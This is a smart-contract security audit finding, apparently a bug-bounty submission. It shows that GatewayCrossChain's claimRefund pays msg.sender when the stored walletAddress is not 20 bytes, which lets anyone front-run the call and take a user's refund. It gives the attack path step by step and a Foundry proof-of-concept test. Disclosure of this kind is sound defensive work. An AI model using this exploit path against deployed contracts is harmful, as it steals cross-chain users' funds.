# Any external EOA} will steal the entire refund balance belonging to the legitimate cross-chain user (when the stored walletAddress is not 20 bytes long).

### Summary

Missing strict validation of walletAddress length and content will cause unauthorized refund claims for legitimate cross-chain users, as any EOA will exploit the fallback to msg.sender and front-run the claimRefund function to steal funds intended for another user.

### Root Cause

In [GatewayCrossChain.sol:493](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L571-L580)
, the claimRefund function lacks a strict check on the length and integrity of walletAddress. When walletAddress.length != 20, the code falls back to msg.sender as the refund recipient without verifying ownership. This allows any EOA to call claimRefund before the legitimate user and steal the refund.

### Internal Pre-conditions

1. The gateway contract needs to call onAbort or onRevert to set refundInfos[externalId].walletAddress to a value with length other than 20 bytes (e.g., a Solana or Bitcoin address, or improperly encoded bytes).

2. The legitimate recipient does not claim the refund immediately, allowing a window of opportunity for others.

3. The attacker (any EOA) needs to monitor the blockchain and detect that a refund has been created with a walletAddress of invalid length.

### External Pre-conditions

1. ZetaChain’s gateway protocol triggers an onAbort or onRevert event due to a failed or reverted cross-chain transaction involving a non-EVM-compatible address (e.g., Bitcoin or Solana address).

2. The cross-chain payload contains a walletAddress field that is not exactly 20 bytes due to format differences in the source chain (e.g., Solana public keys are 32 bytes, Bitcoin addresses vary in size).

3. The gateway does not enforce address normalization or mapping to a 20-byte EVM-compatible address before storing the refund.

### Attack Path

1. A cross-chain transaction fails, and ZetaChain’s gateway calls onRevert or onAbort, setting a RefundInfo with a walletAddress not exactly 20 bytes (e.g., from Solana or Bitcoin).

2. The walletAddress is stored as-is in the refundInfos mapping under a unique externalId.

3. An attacker (any EOA) observes the new RefundInfo on-chain and sees that the stored walletAddress.length != 20.

4. The attacker calls claimRefund(externalId) before the legitimate user or refund bot.

5. Since walletAddress.length != 20, the contract defaults to receiver = msg.sender and transfers the refund amount to the attacker.

6. The attacker successfully drains the refund, and the legitimate user cannot reclaim their funds because the entry is deleted after the first claim.

### Impact

The refund recipient suffers an approximate loss of 100% of their refund amount (value depends on the failed transaction). The attacker gains the full refund, potentially amounting to significant funds if used repeatedly or on high-value transactions.

### PoC

Add the foundry test in the GatewayCrossChainTest.t.sol
```solidity
    function test_RefundFrontRun_PoC() public {
        /* ----------------------- 1. create refundable entry ---------------- */

        bytes32  externalId = keccak256("ExternalId");
        uint256  refundAmt  = 50 ether;
        address  refundToken = address(token1Z);      // any ZRC-20
        bytes    memory btcWallet = btcAddress;       // 32-byte addr

        // put tokens inside the vulnerable contract
        token1Z.mint(address(gatewayCrossChain), refundAmt);

        // gatewayZEVM triggers an Abort -> refundInfos[externalId] filled
        vm.prank(address(gatewayZEVM));
        gatewayCrossChain.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset:  refundToken,
                amount: refundAmt,
                outgoing: false,
                chainID: 7000,
                revertMessage: bytes.concat(externalId, btcWallet)
            })
        );

        /* ----------------------- 2. attacker front-runs claim --------------- */

        address attacker = address(0xDEADBEEF);

        uint256 balBefore = IZRC20(refundToken).balanceOf(attacker);

        vm.prank(attacker);          // attacker is *not* in bots[] list
        gatewayCrossChain.claimRefund(externalId);

        uint256 balAfter  = IZRC20(refundToken).balanceOf(attacker);

        assertEq(
            balAfter - balBefore,
            refundAmt,
            "attacker successfully stole the refund"
        );

        /* ----------------------- 3. legitimate owner blocked --------------- */

        vm.expectRevert();           // record deleted → REFUND_NOT_EXIST
        vm.prank(user1);             // could be the real BTC→EOA owner
        gatewayCrossChain.claimRefund(externalId);
    }
```
